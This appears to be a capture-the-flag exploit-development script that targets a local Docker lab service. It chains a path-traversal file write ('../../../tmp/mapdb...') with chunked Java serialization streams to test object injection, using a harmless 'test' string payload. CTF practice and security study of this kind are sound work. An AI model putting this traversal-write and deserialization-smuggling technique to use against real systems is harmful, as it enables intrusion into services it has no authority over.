#!/usr/bin/env python3
"""
测试注入简单对象
"""
import requests
import base64
import subprocess
import time
import struct

def restart_container():
    subprocess.run("docker stop staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker rm staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker run -d --name staircase_ctf -p 8080:8080 staircase:latest", shell=True, capture_output=True)
    time.sleep(5)

def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def write_chunk(mapdb_name, offset, data):
    """写入一个 chunk"""
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    if len(data) > 8:
        raise ValueError("Data too long")
    
    payload = {
        'fileName': mapdb_path,
        'data': base64.b64encode(data).decode(),
        'offset': offset
    }
    
    return requests.put(f'{url}/files/modify', json=payload, timeout=5)

def build_tc_blockdata_chunks(raw_payload):
    """
    将 payload 转换为 TC_BLOCKDATA chain
    
    每个 chunk: 6 bytes payload + 2 bytes (77 0C = blockdata 12)
    第一个 chunk: AC ED 00 05 77 0C + 2 bytes filler
    """
    chunks = []
    
    # 第一块: stream header + blockdata 12
    # AC ED 00 05 = stream magic + version (4 bytes)
    # 77 0C = TC_BLOCKDATA with 12 bytes to skip (2 bytes)
    # XX XX = 2 bytes filler (will be skipped)
    first_chunk = b'\xac\xed\x00\x05\x77\x0c\x00\x00'
    chunks.append(first_chunk)
    
    # 后续块：6 bytes payload + 77 0C
    remaining = raw_payload[4:]  # skip stream header (already in first chunk)
    
    i = 0
    while i < len(remaining):
        chunk_data = remaining[i:i+6]
        if len(chunk_data) < 6:
            chunk_data = chunk_data + b'\x00' * (6 - len(chunk_data))
        
        if i + 6 < len(remaining):
            # 还有更多数据，添加 blockdata 指令
            chunk = chunk_data + b'\x77\x0c'
        else:
            # 最后一块，不需要 blockdata
            chunk = chunk_data + b'\x00\x00'
        
        chunks.append(chunk)
        i += 6
    
    return chunks

def create_simple_string_payload():
    """
    创建最简单的 String 对象
    AC ED 00 05 74 00 04 t e s t
    """
    payload = b'\xac\xed\x00\x05'  # stream header
    payload += b'\x74'  # TC_STRING
    payload += struct.pack('>H', 4)  # string length
    payload += b'test'  # string data
    return payload

def create_null_payload():
    """
    创建 null 对象
    AC ED 00 05 70
    """
    return b'\xac\xed\x00\x05\x70'

def main():
    print("Restarting container...")
    restart_container()
    mapdb_name = get_mapdb_name()
    print(f"MapDB: {mapdb_name}")
    
    # 测试简单的 String payload
    raw_payload = create_simple_string_payload()
    print(f"\nRaw payload: {raw_payload.hex()}")
    print(f"Raw payload size: {len(raw_payload)} bytes")
    
    chunks = build_tc_blockdata_chunks(raw_payload)
    print(f"Number of chunks: {len(chunks)}")
    
    for i, chunk in enumerate(chunks):
        print(f"  Chunk {i}: {chunk.hex()}")
    
    # 写入所有 chunks
    print("\nWriting chunks...")
    base_offset = 0x100249
    
    for i, chunk in enumerate(chunks):
        offset = base_offset + i * 20
        resp = write_chunk(mapdb_name, offset, chunk)
        print(f"  Chunk {i} at 0x{offset:x}: {resp.status_code}")
    
    # 检查 icon
    print("\nChecking icon...")
    resp = requests.get('http://localhost:8080/files/icon', timeout=5)
    print(f"Icon response: {resp.status_code}")
    
    # 查看日志
    result = subprocess.run('docker logs --tail 20 staircase_ctf 2>&1', 
                           shell=True, capture_output=True, text=True)
    print(f"\nDocker logs:\n{result.stdout[-1000:]}")

if __name__ == "__main__":
    main()
